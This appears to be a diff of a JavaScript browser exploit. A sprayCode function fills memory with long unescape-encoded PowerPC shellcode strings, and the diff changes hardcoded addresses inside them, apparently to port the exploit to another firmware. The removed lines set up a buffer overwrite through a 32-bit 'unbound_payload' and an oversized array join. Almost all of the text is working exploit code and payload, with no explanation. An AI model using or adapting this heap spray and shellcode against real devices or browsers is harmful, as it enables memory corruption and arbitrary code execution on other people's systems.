     str    += unescape("%u7c9d%u2378%u7cbf%u2b78%u3f80%u0180%u7f9f%ue000%u419e%u0024%u7fe3%ufb78%u7fc4%uf378%u7fa5%ueb78%u4bff%uff71%u2f83%u0000%u419e%u005c%u3bff%u0004%u4bff%uffdc%u3f80%u0f84%u3fe0%u0d80%u639c%u8a0c");
-    str    += unescape("%u7fe3%ufb78%u7fc4%uf378%u7fa5%ueb78%u4bff%uff45%u2f83%u0000%u419e%u0030%u3bff%u0004%u7f9f%ue000%u409e%uffe0%u3d20%u0103%u3c60%u0180%u6129%u1368%u3863%u219c%u7d29%u03a6%u4e80%u0421%u3860%u0000");
+    str    += unescape("%u7fe3%ufb78%u7fc4%uf378%u7fa5%ueb78%u4bff%uff45%u2f83%u0000%u419e%u0030%u3bff%u0004%u7f9f%ue000%u409e%uffe0%u3d20%u0103%u3c60%u0180%u6129%u0ecc%u3863%u219c%u7d29%u03a6%u4e80%u0421%u3860%u0000");
     str    += unescape("%u4800%u0008%u7fe3%ufb78%u3961%u0018%u4800%u15b8%u7c08%u02a6%u9421%ufff0%u93e1%u000c%u7c7f%u1b78%u9001%u0014%u3860%u0001%u3880%u0000%u38a0%u0000%u38c0%u0000%u38e0%u0000%u3d00%u0001%u7fe9%ufb78");
     str    += unescape("%u3800%u3400%u7c3f%u0b78%u4400%u0002%u6000%u0000%u7fe1%ufb78%u7c7f%u1b78%u3961%u0010%u7fe3%ufb78%u4800%u1570%u7c08%u02a6%u9421%ufff0%ubfc1%u0008%u7c7f%u1b78%u9001%u0014%u7c9e%u2378%u3860%u0001");
     str    += unescape("%u3880%u0000%u7fc5%uf378%u38c0%u0000%u38e0%u0000%u3d00%u0001%u7fe9%ufb78%u7c3e%u0b78%u3800%u3500%u4400%u0002%u6000%u0000%u7fc1%uf378%u3961%u0010%u4800%u151c%u9421%ufea0%u7c08%u02a6%u3c60%u0180");
-    str    += unescape("%ube41%u0128%u3fe0%u0102%u63ff%ua31c%u9001%u0164%u7fe9%u03a6%u3863%u21ae%u3881%u0124%u4e80%u0421%u3c60%u0180%u7fe9%u03a6%u3881%u0120%u3863%u21b7%u3fe0%u0102%u63ff%ub790%u4e80%u0421%u8061%u0124");
+    str    += unescape("%ube41%u0128%u3fe0%u0102%u63ff%u9cd8%u9001%u0164%u7fe9%u03a6%u3863%u21ae%u3881%u0124%u4e80%u0421%u3c60%u0180%u7fe9%u03a6%u3881%u0120%u3863%u21b7%u3fe0%u0102%u63ff%ub3e4%u4e80%u0421%u8061%u0124");
     str    += unescape("%u4bff%uf7a1%u8061%u0124%u4bff%ufb29%u3ca0%u0180%u7fe9%u03a6%u8061%u0124%u3880%u0000%u38a5%u207c%u38c1%u011c%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u0124%u3880%u0000%u38a5%u21be%u38c1%u0118");
     str    += unescape("%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u0124%u3880%u0000%u38a5%u2083%u38c1%u0114%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u0124%u3880%u0000%u38a5%u2095%u38c1%u0110%u4e80%u0421%u3ca0%u0180");
     str    += unescape("%u7fe9%u03a6%u8061%u0124%u3880%u0000%u38a5%u20ef%u38c1%u010c%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u0124%u3880%u0000%u38a5%u21c5%u38c1%u0108%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u0124");
@@ -107,7 +95,7 @@ function sprayCode(n) {
     str    += unescape("%u3860%u0300%u7d29%u03a6%u4e80%u0421%u8121%u0114%u7c7f%u1b78%u3880%u0020%u7d29%u03a6%u3860%u0300%u4e80%u0421%u8121%u0114%u7c7e%u1b78%u3880%u0008%u7d29%u03a6%u3860%u1000%u4e80%u0421%u8161%u0100");
     str    += unescape("%u38a0%u0000%u38c0%u0000%u7d69%u03a6%u38ff%u0300%u3900%u0300%u3940%u0001%u8081%u00f4%u3920%u0000%u7c7b%u1b78%u4e80%u0421%u8121%u0114%u7c7d%u1b78%u3880%u0008%u7d29%u03a6%u3860%u1000%u4e80%u0421");
     str    += unescape("%u8161%u0100%u8081%u00f4%u38a0%u0000%u38c0%u0000%u38fe%u0300%u3900%u0300%u3920%u0000%u3940%u0004%u7d69%u03a6%u7c7c%u1b78%u4e80%u0421%u2f9d%u0000%u419e%u000c%u2f83%u0000%u409e%u002c%u8061%u0124");
-    str    += unescape("%u3c80%u0180%u3884%u2218%u38a0%u0001%u4bff%uf889%u3c60%u2fff%u6063%uffff%u4bff%uf52d%u8061%u0124%u4bff%uf9f1%u8061%u0124%u3c80%u0180%u3884%u2244%u38a0%u0001%u4bff%uf861%u3d20%u0102%u6129%ub790");
+    str    += unescape("%u3c80%u0180%u3884%u2218%u38a0%u0001%u4bff%uf889%u3c60%u2fff%u6063%uffff%u4bff%uf52d%u8061%u0124%u4bff%uf9f1%u8061%u0124%u3c80%u0180%u3884%u2244%u38a0%u0001%u4bff%uf861%u3d20%u0102%u6129%ub3e4");
     str    += unescape("%u3ca0%u0180%u38c1%u00e8%u7d29%u03a6%u8061%u0124%u3880%u0000%u38a5%u2257%u3fa0%u0180%u3bbd%u1fa0%u4e80%u0421%u8121%u00e8%u7fa4%ueb78%u38a0%u002c%u3929%u0044%u3861%u0040%u9121%u00e8%u4bff%ufb8d");
     str    += unescape("%u80a1%u00f8%u3880%u002c%u3861%u0040%u4bff%ufba1%u389d%u002c%u7c7a%u1b78%u3861%u009c%u7ca4%uc4aa%u7ca3%uc5aa%u3880%u0018%u80a1%u00f8%u4bff%ufb81%u389d%u0044%u7c77%u1b78%u3861%u0084%u7ca4%uc4aa");
     str    += unescape("%u7ca3%uc5aa%u3880%u0018%u80a1%u00f8%u4bff%ufb61%u389d%u005c%u7c73%u1b78%u38a0%u0038%u3861%u0008%u4bff%ufb29%u80a1%u00f8%u3880%u0038%u3861%u0008%u4bff%ufb3d%u389d%u0094%u7c74%u1b78%u3861%u006c");
@@ -124,18 +112,18 @@ function sprayCode(n) {
     str    += unescape("%u38c0%u0000%u7f09%u03a6%u4e80%u0421%u3880%u0004%u7c7d%u1b78%u38a0%u0000%u7f43%ud378%u38c0%u0000%u7f09%u03a6%u4e80%u0421%u7c69%ueb79%u41a2%u0038%u8061%u0124%u3c80%u0180%u3884%u226e%u38a0%u0002");
     str    += unescape("%u4bff%uf4d5%u3c60%u2fff%u6063%uffff%u4bff%uf179%u8061%u0124%u8081%u00ec%u4bff%uf6c1%u8061%u0124%u4bff%uf631%u8121%u0114%u3860%u1000%u3880%u0020%u7d29%u03a6%u4e80%u0421%u7c7d%u1b79%u40a2%u0038");
     str    += unescape("%u8061%u0124%u3c80%u0180%u3884%u22a7%u38a0%u0002%u4bff%uf485%u3c60%u2fff%u6063%uffff%u4bff%uf129%u8061%u0124%u8081%u00ec%u4bff%uf671%u8061%u0124%u4bff%uf5e1%u3d20%u0123%u7fa3%ueb78%u6129%u4567");
-    str    += unescape("%u3880%u1000%u913d%u0000%u3d20%u4452%u6129%u5648%u913d%u0fb4%u3d20%u4158%u913d%u0fb8%u3920%u0008%u913d%u0ff4%u3d20%uffea%u6129%ua1b0%u913d%u0ff8%u8121%u010c%u7d29%u03a6%u4e80%u0421%u8121%u0108");
+    str    += unescape("%u3880%u1000%u913d%u0000%u3d20%u4452%u6129%u5648%u913d%u0fb4%u3d20%u4158%u913d%u0fb8%u3920%u0008%u913d%u0ff4%u3d20%uffea%u6129%u95f0%u913d%u0ff8%u8121%u010c%u7d29%u03a6%u4e80%u0421%u8121%u0108");
     str    += unescape("%u3880%u1000%u7fa3%ueb78%u7d29%u03a6%u4e80%u0421%u8121%u00fc%u7f63%udb78%u7d29%u03a6%u4e80%u0421%u8121%u00fc%u7f83%ue378%u7d29%u03a6%u4e80%u0421%u3ca0%uc000%u3880%u0004%u60a5%u0004%u38c0%u0004");
-    str    += unescape("%u7f29%u03a6%u7f43%ud378%u4e80%u0421%u3920%u0000%u38c0%u1000%u913e%u01ac%u7fa5%ueb78%u913f%u01fc%u3880%u0004%u7f29%u03a6%u7f43%ud378%u3fc0%ufff0%u63de%u2274%u4e80%u0421%u8121%u0114%u3880%u0004");
+    str    += unescape("%u7f29%u03a6%u7f43%ud378%u4e80%u0421%u3920%u0000%u38c0%u1000%u913e%u01ac%u7fa5%ueb78%u913f%u01fc%u3880%u0004%u7f29%u03a6%u7f43%ud378%u3fc0%ufff0%u63de%u21f4%u4e80%u0421%u8121%u0114%u3880%u0004");
     str    += unescape("%u3860%u0008%u7d29%u03a6%u4e80%u0421%u8121%u0118%u3c80%u0180%u38a0%u0007%u7d29%u03a6%u3884%u22d7%u7c7f%u1b78%u4e80%u0421%u8121%u0114%u3880%u0004%u3860%u0008%u7d29%u03a6%u4e80%u0421%u3d20%ufff0");
-    str    += unescape("%u6129%u2294%u7c65%u1b78%u9123%u0004%u3880%u0006%u93c3%u0000%u38c0%u0008%u7f29%u03a6%u7fe3%ufb78%u4e80%u0421%u3920%u002a%u7c25%u0b78%u7fe3%ufb78%u9525%u00e4%u3880%u0006%u38c0%u0004%u7ea9%u03a6");
+    str    += unescape("%u6129%u2214%u7c65%u1b78%u9123%u0004%u3880%u0006%u93c3%u0000%u38c0%u0008%u7f29%u03a6%u7fe3%ufb78%u4e80%u0421%u3920%u002a%u7c25%u0b78%u7fe3%ufb78%u9525%u00e4%u3880%u0006%u38c0%u0004%u7ea9%u03a6");
     str    += unescape("%u4e80%u0421%u8121%u00e4%u7f89%uf000%u419e%u0038%u8061%u0124%u3c80%u0180%u3884%u22de%u38a0%u0002%u4bff%uf2f5%u3c60%u2fff%u6063%uffff%u4bff%uef99%u8061%u0124%u8081%u00ec%u4bff%uf4e1%u8061%u0124");
     str    += unescape("%u4bff%uf451%u3c60%uff20%u3f60%uff20%u6063%u000c%u3f40%u4452%u4bff%uf6fd%u3f20%u4452%u5463%u2036%u3bc0%u0000%u3fa3%uff20%u3be0%u0000%u3bbd%u0014%u637b%u0013%u635a%u5641%u6339%u5648%u7f9d%ud840");
     str    += unescape("%u409d%u0048%u7fa3%ueb78%u4bff%uf6c9%u7c7c%u1b78%u4bff%uf6c1%u7f83%ud000%u419e%u0014%u7f83%uc800%u40be%u0010%u7f9e%ue378%u4800%u0008%u7f9f%ue378%u2f9f%u0000%u419e%u000c%u2f9e%u0000%u409e%u0050");
     str    += unescape("%u3bbd%ufff0%u4bff%uffb8%u2f9f%u0000%u419e%u000c%u2f9e%u0000%u409e%u0038%u8061%u0124%u3c80%u0180%u3884%u2306%u38a0%u0002%u4bff%uf22d%u3c60%u2fff%u6063%uffff%u4bff%ueed1%u8061%u0124%u8081%u00ec");
-    str    += unescape("%u4bff%uf419%u8061%u0124%u4bff%uf389%u387e%u0048%u7fe4%ufb78%u4bff%uf691%u3c60%uffea%u6063%uaa58%u3c80%u1000%u4bff%uf681%u3c60%uffea%u3c80%u2830%u6063%uaa5c%u6084%u5800%u4bff%uf66d%u8061%u0124");
+    str    += unescape("%u4bff%uf419%u8061%u0124%u4bff%uf389%u387e%u0048%u7fe4%ufb78%u4bff%uf691%u3c60%uffea%u6063%u9e94%u3c80%u1000%u4bff%uf681%u3c60%uffea%u3c80%u2830%u6063%u9e98%u6084%u5800%u4bff%uf66d%u8061%u0124");
     str    += unescape("%u3c80%u0180%u38a0%u0002%u3884%u2339%u4bff%uf1c9%u3c60%u1fff%u6063%uffff%u4bff%uee6d%u8061%u0124%u8081%u00f0%u4bff%uf3b5%u8061%u0124%u4bff%uf325%u3961%u0160%u4800%u0b68%u7c08%u02a6%u9421%uffc0");
-    str    += unescape("%u3ca0%u0180%ubf61%u002c%u3fc0%u0102%u9001%u0044%u63de%ub790%u7c7f%u1b78%u7fc9%u03a6%u7c9c%u2378%u8063%u0004%u3880%u0000%u38a5%u2fd4%u38c1%u001c%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u807f%u0004");
+    str    += unescape("%u3ca0%u0180%ubf61%u002c%u3fc0%u0102%u9001%u0044%u63de%ub3e4%u7c7f%u1b78%u7fc9%u03a6%u7c9c%u2378%u8063%u0004%u3880%u0000%u38a5%u2fd4%u38c1%u001c%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u807f%u0004");
     str    += unescape("%u3880%u0000%u38a5%u2fe1%u38c1%u0018%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u807f%u0004%u3880%u0000%u38a5%u2ff9%u38c1%u0014%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u807f%u0004%u3880%u0000%u38a5%u300d");
     str    += unescape("%u38c1%u0010%u4e80%u0421%u3ca0%u0180%u7fc9%u03a6%u807f%u0004%u3880%u0000%u38a5%u3023%u38c1%u000c%u4e80%u0421%u3ca0%u0180%u38a5%u3039%u38c1%u0008%u3880%u0000%u807f%u0004%u7fc9%u03a6%u4e80%u0421");
     str    += unescape("%u8121%u001c%u7d29%u03a6%u4e80%u0421%u8121%u0018%u3860%u0000%u7d29%u03a6%u4e80%u0421%u8121%u0018%u7c7e%u1b78%u3860%u0001%u7d29%u03a6%u3fbe%uf400%u4e80%u0421%u8121%u0014%u7c7b%u1b78%u3c80%uf400");
@@ -143,14 +131,14 @@ function sprayCode(n) {
     str    += unescape("%u7d29%u03a6%u4e80%u0421%u813f%u001c%u3c60%uf400%u7fc4%uf378%u7d29%u03a6%u4e80%u0421%u813f%u001c%u7f64%udb78%u7fa3%ueb78%u7d29%u03a6%u4e80%u0421%u8121%u000c%u3860%u0000%u7d29%u03a6%u4e80%u0421");
     str    += unescape("%u8121%u000c%u3860%u0001%u7d29%u03a6%u4e80%u0421%u8121%u0008%u3880%u0000%u38a0%u0000%u7f86%ue378%u7d29%u03a6%u3860%u0001%u4e80%u0421%u8121%u000c%u3860%u0001%u7d29%u03a6%u4e80%u0421%u8121%u0010");
     str    += unescape("%u3860%u0001%u3880%u0000%u7d29%u03a6%u4e80%u0421%u3d20%u4000%u7d29%u03a6%u4240%u000c%u6000%u0000%u4bff%ufff8%u813f%u0024%u7d29%u03a6%u4e80%u0421%u3961%u0040%u4800%u098c%u9421%uffe8%u7c08%u02a6");
-    str    += unescape("%u3920%u0000%u3c60%u0180%u9121%u0008%u3d20%u0102%u6129%ua31c%u9001%u001c%u3881%u000c%u7d29%u03a6%u3863%u304b%u4e80%u0421%u3d20%u0102%u6129%ub790%u3ca0%u0180%u8061%u000c%u38c1%u0008%u7d29%u03a6");
+    str    += unescape("%u3920%u0000%u3c60%u0180%u9121%u0008%u3d20%u0102%u6129%u9cd8%u9001%u001c%u3881%u000c%u7d29%u03a6%u3863%u304b%u4e80%u0421%u3d20%u0102%u6129%ub3e4%u3ca0%u0180%u8061%u000c%u38c1%u0008%u7d29%u03a6");
     str    += unescape("%u3880%u0000%u38a5%u3056%u4e80%u0421%u8121%u0008%u7d29%u03a6%u4e80%u0421%u8001%u001c%u3821%u0018%u7c08%u03a6%u4e80%u0020%u9421%uffe0%u7c08%u02a6%ubf41%u0008%u7c9f%u2379%u9001%u0024%u7c7e%u1b78");
     str    += unescape("%u7cbd%u2b78%u7cdc%u3378%u7cfb%u3b78%u7d1a%u4378%u4182%u0024%u813f%u0000%u6d2a%u7f45%u2f8a%u4c46%u409e%u0014%u813f%u0010%u6d2a%u0002%u2f8a%u0014%u419e%u0014%u3c80%u0180%u7fc3%uf378%u3884%u306a");
     str    += unescape("%u4bff%ufd39%u80ff%u0020%u3960%u0000%ua11f%u0030%u7cff%u3a14%u7ce9%u3b78%u7f8b%u4000%u409c%u0060%ua0df%u0032%u8149%u0000%u1cc6%u0028%u7cc7%u3214%u80a6%u0010%u7caa%u2a14%u7faa%ueb78%u7cbf%u2a14");
     str    += unescape("%u38a5%uffff%u8c05%u0001%u2f80%u0000%u419e%u0020%u88ca%u0000%u2f86%u0000%u419e%u0014%u7f80%u3040%u409e%u0060%u394a%u0001%u4bff%uffdc%u894a%u0000%u7f8a%u0000%u41be%u0024%u4800%u0048%u2f9a%u0000");
     str    += unescape("%u3be0%u0000%u41be%u0048%u7fc3%uf378%u7fa4%ueb78%u4bff%ufca9%u4800%u0038%u2f9b%u0000%u419e%u000c%u8149%u000c%u915b%u0000%u2f9c%u0000%u419e%u000c%u8149%u0014%u915c%u0000%u83e9%u0010%u4800%u0010");
-    str    += unescape("%u396b%u0001%u3929%u0028%u4bff%uff50%u3961%u0020%u7fe3%ufb78%u4800%u07e8%u7c08%u02a6%u9421%uff58%u3d20%u0102%u3c60%u0180%u6129%ua31c%ubfa1%u009c%u9001%u00ac%u7d29%u03a6%u3863%u307b%u3881%u008c");
-    str    += unescape("%u3fe0%u0102%u63ff%ub790%u4e80%u0421%u3ca0%u0180%u38c1%u0084%u8061%u008c%u3880%u0000%u38a5%u3088%u7fe9%u03a6%u4e80%u0421%u8121%u0084%u3880%u0000%u38a0%u003c%u7d29%u03a6%u3861%u0008%u4e80%u0421");
+    str    += unescape("%u396b%u0001%u3929%u0028%u4bff%uff50%u3961%u0020%u7fe3%ufb78%u4800%u07e8%u7c08%u02a6%u9421%uff58%u3d20%u0102%u3c60%u0180%u6129%u9cd8%ubfa1%u009c%u9001%u00ac%u7d29%u03a6%u3863%u307b%u3881%u008c");
+    str    += unescape("%u3fe0%u0102%u63ff%ub3e4%u4e80%u0421%u3ca0%u0180%u38c1%u0084%u8061%u008c%u3880%u0000%u38a5%u3088%u7fe9%u03a6%u4e80%u0421%u8121%u0084%u3880%u0000%u38a0%u003c%u7d29%u03a6%u3861%u0008%u4e80%u0421");
     str    += unescape("%u8121%u0084%u8061%u008c%u3ca0%u0180%u9121%u0014%u3d20%u0180%u3929%u2364%u9061%u000c%u9121%u0008%u3880%u0001%u38a5%u308f%u38c1%u0088%u7fe9%u03a6%u4e80%u0421%u8121%u0088%u3ca0%u0180%u8061%u008c");
     str    += unescape("%u8129%u0000%u3880%u0001%u38a5%u30a9%u38c1%u0088%u9121%u001c%u7fe9%u03a6%u4e80%u0421%u8121%u0088%u3ca0%u0180%u8061%u008c%u8129%u0000%u3880%u0000%u38a5%u30be%u38c1%u0010%u9121%u0020%u7fe9%u03a6");
     str    += unescape("%u4e80%u0421%u3ca0%u0180%u8061%u008c%u3880%u0000%u38a5%u30c5%u38c1%u0018%u7fe9%u03a6%u4e80%u0421%u3ca0%u0180%u8061%u008c%u3880%u0000%u38a5%u30db%u38c1%u0024%u7fe9%u03a6%u4e80%u0421%u3ca0%u0180");
@@ -159,7 +147,7 @@ function sprayCode(n) {
     str    += unescape("%u8061%u008c%u3880%u0000%u38a5%u3108%u38c1%u007c%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u008c%u3880%u0000%u38a5%u3111%u38c1%u0078%u4e80%u0421%u3ca0%u0180%u7fe9%u03a6%u8061%u008c%u3880%u0000");
     str    += unescape("%u38a5%u3123%u38c1%u0074%u4e80%u0421%u3ca0%u0180%u3880%u0000%u38a5%u3135%u38c1%u0070%u7fe9%u03a6%u8061%u008c%u4e80%u0421%u8121%u0080%u7d29%u03a6%u4e80%u0421%u8121%u0074%u7c7e%u1b78%u3880%u0040");
     str    += unescape("%u3860%u0100%u7d29%u03a6%u4e80%u0421%u7c7f%u1b79%u40a2%u0014%u3c80%u0180%u3861%u0008%u3884%u3144%u4bff%ufa19%u8121%u0014%u7fe3%ufb78%u3880%u0000%u38a0%u0100%u7d29%u03a6%u4e80%u0421%u8121%u0078");
-    str    += unescape("%u38e0%u0000%u7fe4%ufb78%u38a0%u0003%u38c0%u0000%u7d29%u03a6%u7fc3%uf378%u4e80%u0421%u8121%u007c%u7fc3%uf378%u7d29%u03a6%u4e80%u0421%u8121%u0070%u7fe3%ufb78%u3fe0%u0102%u7d29%u03a6%u63ff%ub790");
+    str    += unescape("%u38e0%u0000%u7fe4%ufb78%u38a0%u0003%u38c0%u0000%u7d29%u03a6%u7fc3%uf378%u4e80%u0421%u8121%u007c%u7fc3%uf378%u7d29%u03a6%u4e80%u0421%u8121%u0070%u7fe3%ufb78%u3fe0%u0102%u7d29%u03a6%u63ff%ub3e4");
     str    += unescape("%u4e80%u0421%u3ca0%u0180%u8061%u008c%u3880%u0000%u38a5%u3172%u38c1%u006c%u7fe9%u03a6%u4e80%u0421%u3ca0%u0180%u8061%u008c%u3880%u0000%u38a5%u3181%u38c1%u0068%u7fe9%u03a6%u4e80%u0421%u3ca0%u0180");
     str    += unescape("%u38a5%u3190%u38c1%u0064%u8061%u008c%u3880%u0000%u7fe9%u03a6%u4e80%u0421%u8121%u001c%u3880%u0020%u3860%u4000%u7d29%u03a6%u4e80%u0421%u8121%u001c%u7c7d%u1b78%u3880%u0008%u3860%u1000%u7d29%u03a6");
     str    += unescape("%u4e80%u0421%u7c7e%u1b79%u4182%u000c%u2f9d%u0000%u40be%u0014%u3c80%u0180%u3861%u0008%u3884%u31a5%u4bff%uf919%u8161%u006c%u3c80%u0180%u7fc3%uf378%u3884%u15f4%u38a0%u0001%u38c1%u0008%u38fd%u4000");
@@ -172,14 +160,14 @@ function sprayCode(n) {
     str    += unescape("%u3900%u0000%u9121%u0050%u9121%u004c%u4bff%uf9dd%u7c64%u1b79%u41a2%u003c%u8121%u0008%u8061%u0050%u7c89%u2214%u8121%u0010%u3c63%uc000%u80a1%u004c%u7d29%u03a6%u4e80%u0421%u8061%u0050%u8121%u0024");
     str    += unescape("%u3c63%uc000%u8081%u004c%u7d29%u03a6%u4e80%u0421%u8081%u0008%u3ca0%u0180%u3920%u0000%u3861%u0008%u38a5%u3229%u38c1%u0044%u38e1%u0048%u3900%u0000%u9121%u0048%u9121%u0044%u4bff%uf971%u2f83%u0000");
     str    += unescape("%u41be%u0038%u8121%u0014%u3880%u0000%u8061%u0048%u7d29%u03a6%u80a1%u0044%u3c63%uc000%u4e80%u0421%u8061%u0048%u8121%u0024%u3c63%uc000%u8081%u0044%u7d29%u03a6%u4e80%u0421%u3c60%uffea%u3c80%u0180");
-    str    += unescape("%u6063%ua1b8%u3884%u004c%u4bff%uecdd%u3c60%uffe8%u3c80%ufff0%u6063%u4d40%u6084%u2274%u3fe0%uc080%u4bff%uecc5%u3c60%uffe8%u3c80%ufff0%u6063%u5140%u6084%u2274%u63ff%u1500%u4bff%uecad%u3c60%uffe8");
-    str    += unescape("%u3c80%ufff0%u6063%u5540%u6084%u2274%u4bff%uec99%u3c60%uffea%u3c80%ufff0%u6063%u9db0%u6084%u2274%u4bff%uec85%u3c60%uffe8%u3c80%ufff0%u6063%u4d44%u6084%u2294%u4bff%uec71%u3c60%uffe8%u3c80%ufff0");
-    str    += unescape("%u6063%u5144%u6084%u2294%u4bff%uec5d%u3c60%uffe8%u3c80%ufff0%u6063%u5544%u6084%u2294%u4bff%uec49%u3c60%uffea%u3c80%ufff0%u6063%u9db4%u6084%u2294%u4bff%uec35%u4bff%ue21d%u8121%u0014%u38a0%u0020");
-    str    += unescape("%u3880%u0000%u7d29%u03a6%u7fe3%ufb78%u4e80%u0421%u3d20%uc080%u3940%u0214%u6129%u1404%u9149%u0000%u3d20%udead%u3d40%uc080%u6129%uc0de%u614a%u1400%u3c60%uc201%u912a%u0000%u3d40%uc080%u614a%u1300");
-    str    += unescape("%u6063%uc55c%u912a%u0000%u3d20%uc080%u3940%u0000%u6129%u1304%u9149%u0000%u3d20%u0102%u6129%ua31c%u3880%u0004%u913f%u0000%u3d20%u0102%u6129%ub790%u913f%u0004%u3d20%uffe8%u6129%u4c70%u913f%u000c");
-    str    += unescape("%u3d20%uffe8%u6129%u5070%u913f%u0010%u3d20%uffe8%u6129%u5470%u913f%u0014%u3d20%uffea%u6129%u9ce0%u913f%u0018%u3d20%uffea%u6129%ua0e0%u913f%u001c%u3d20%u1005%u6129%ud180%u913f%u0008%u8121%u0008");
-    str    += unescape("%u8129%u0018%u5529%u01ba%u6529%u4800%u6129%u0003%u9123%u0000%u8121%u0024%u7d29%u03a6%u4e80%u0421%u8121%u0028%u3c60%u0101%u3880%u0004%u7d29%u03a6%u6063%uc55c%u4e80%u0421%u8121%u0020%u7fc3%uf378");
-    str    += unescape("%u7d29%u03a6%u4e80%u0421%u8121%u0020%u7fa3%ueb78%u7d29%u03a6%u4e80%u0421%u3c60%uffea%u6063%uaa58%u3880%u0000%u4bff%ueb01%u3c60%uffea%u6063%uaa5c%u3c80%u1400%u4bff%ueaf1%u8121%u002c%u7d29%u03a6");
+    str    += unescape("%u6063%u95f8%u3884%u004c%u4bff%uecdd%u3c60%uffe8%u3c80%ufff0%u6063%u4d40%u6084%u21f4%u3fe0%uc080%u4bff%uecc5%u3c60%uffe8%u3c80%ufff0%u6063%u5140%u6084%u21f4%u63ff%u1500%u4bff%uecad%u3c60%uffe8");
+    str    += unescape("%u3c80%ufff0%u6063%u5540%u6084%u21f4%u4bff%uec99%u3c60%uffea%u3c80%ufff0%u6063%u91f0%u6084%u21f4%u4bff%uec85%u3c60%uffe8%u3c80%ufff0%u6063%u4d44%u6084%u2214%u4bff%uec71%u3c60%uffe8%u3c80%ufff0");
+    str    += unescape("%u6063%u5144%u6084%u2214%u4bff%uec5d%u3c60%uffe8%u3c80%ufff0%u6063%u5544%u6084%u2214%u4bff%uec49%u3c60%uffea%u3c80%ufff0%u6063%u91f4%u6084%u2214%u4bff%uec35%u4bff%ue21d%u8121%u0014%u38a0%u0020");
+    str    += unescape("%u3880%u0000%u7d29%u03a6%u7fe3%ufb78%u4e80%u0421%u3d20%uc080%u3940%u01f4%u6129%u1404%u9149%u0000%u3d20%udead%u3d40%uc080%u6129%uc0de%u614a%u1400%u3c60%uc201%u912a%u0000%u3d40%uc080%u614a%u1300");
+    str    += unescape("%u6063%uc15c%u912a%u0000%u3d20%uc080%u3940%u0000%u6129%u1304%u9149%u0000%u3d20%u0102%u6129%u9cd8%u3880%u0004%u913f%u0000%u3d20%u0102%u6129%ub3e4%u913f%u0004%u3d20%uffe8%u6129%u4c70%u913f%u000c");
+    str    += unescape("%u3d20%uffe8%u6129%u5070%u913f%u0010%u3d20%uffe8%u6129%u5470%u913f%u0014%u3d20%uffea%u6129%u9120%u913f%u0018%u3d20%uffea%u6129%u9520%u913f%u001c%u3d20%u1005%u6129%ucb00%u913f%u0008%u8121%u0008");
+    str    += unescape("%u8129%u0018%u5529%u01ba%u6529%u4800%u6129%u0003%u9123%u0000%u8121%u0024%u7d29%u03a6%u4e80%u0421%u8121%u0028%u3c60%u0101%u3880%u0004%u7d29%u03a6%u6063%uc15c%u4e80%u0421%u8121%u0020%u7fc3%uf378");
+    str    += unescape("%u7d29%u03a6%u4e80%u0421%u8121%u0020%u7fa3%ueb78%u7d29%u03a6%u4e80%u0421%u3c60%uffea%u6063%u9e94%u3880%u0000%u4bff%ueb01%u3c60%uffea%u6063%u9e98%u3c80%u1400%u4bff%ueaf1%u8121%u002c%u7d29%u03a6");
     str    += unescape("%u4e80%u0421%u3961%u00a8%u4800%u0040%u81cb%uffb8%u81eb%uffbc%u820b%uffc0%u822b%uffc4%u824b%uffc8%u826b%uffcc%u828b%uffd0%u82ab%uffd4%u82cb%uffd8%u82eb%uffdc%u830b%uffe0%u832b%uffe4%u834b%uffe8");
     str    += unescape("%u836b%uffec%u838b%ufff0%u83ab%ufff4%u83cb%ufff8%u800b%u0004%u83eb%ufffc%u7c08%u03a6%u7d61%u5b78%u4e80%u0020%u801f%u0000%u7c09%u03a6%u4e80%u0421%u83ff%u0004%u2c1f%u0000%u4082%uffec%u8001%u0014");
     str    += unescape("%u83e1%u000c%u7c08%u03a6%u3821%u0010%u4e80%u0020%u8061%u0008%u8081%u000c%u8001%u0014%u7c08%u03a6%u3821%u0010%u4e80%u0020%u80a1%u0008%u3821%u0010%u7ca3%u2b78%u8081%u0004%u7c88%u03a6%u4e80%u0020");
@@ -567,83 +555,26 @@ function sprayCode(n) {
     str    += unescape("%u0000%u7f40%u0000%u7f44%u0000%u7f48%u0000%u7f4c%u0000%u7f50%u0000%u7f54%u0000%u7f58%u0000%u7f5c%u0000%u7f60%u0000%u7f64%u0000%u7f68%u0000%u7f6c%u0000%u7f70%u0000%u7f74%u0000%u7f78%u0000%u7f7c");
     str    += unescape("%u0000%u7f80%u0000%u7f84%u0000%u7f88%u0000%u7f8c%u0000%u7f90%u0000%u7f94%u0000%u7f98%u0000%u7f9c%u0000%u7fa0%u0000%u7fa4%u0000%u7fa8%u0000%u7fac%u0000%u7fb0%u0000%u7fb4%u0000%u7fb8%u0000%u7fbc");
     str    += unescape("%u0000%u7fc0%u0000%u7fc4%u0000%u7fc8%u0000%u7fcc%u0000%u7fd0%u0000%u7fd4%u0000%u7fd8%u0000%u7fdc%u0000%u7fe0%u0000%u7fe4%u0000%u7fe8%u0000%u7fec%u0000%u7ff0%u0000%u7ff4%u0000%u7ff8%u0000%u7ffc");
-	
-	var h1 = [];
-	h1[0] = str.substring(0, str.length);
-					
-	for (i = 1; i <= n; i++)
-		h1[i] = unescape(h1[0]);
-		
-	return h1;
-}
-	
-// Format uint32.
-function uint32(value){
-  var s = '';
-  for (var i = 0; i < 4; i++) {
-    s += String.fromCharCode((value >> (i * 8)) & 0xff);
-  }
-  return s;
-}
 
-// Memory placeholder.
-holder = [];
+                var h1 = [];
+                h1[0] = str.substring(0, str.length);
+                
+                for (i = 1; i <= n; i++)
+                    h1[i] = unescape(h1[0]);
+                    
+                return h1;
+            }            
 
-// Allocate the overwrite string.
-unbound_payload = uint32(0xffffffff);
-overwrite_string = alloc(0x1A0, 0) + unbound_payload;
-
-// Flatten overwrite_string.
-holder.push(overwrite_string[0]);
-
-// Build the overwrite array.
-arr = [];
-
-// Array to be joined.
-// 0x10000 * 0x10000 + 0x1A0 + 0x4 = 0x1000001A4
-// Buffer size is 0x1A4.
-function build_arr() { 
-  arr.length = 0;
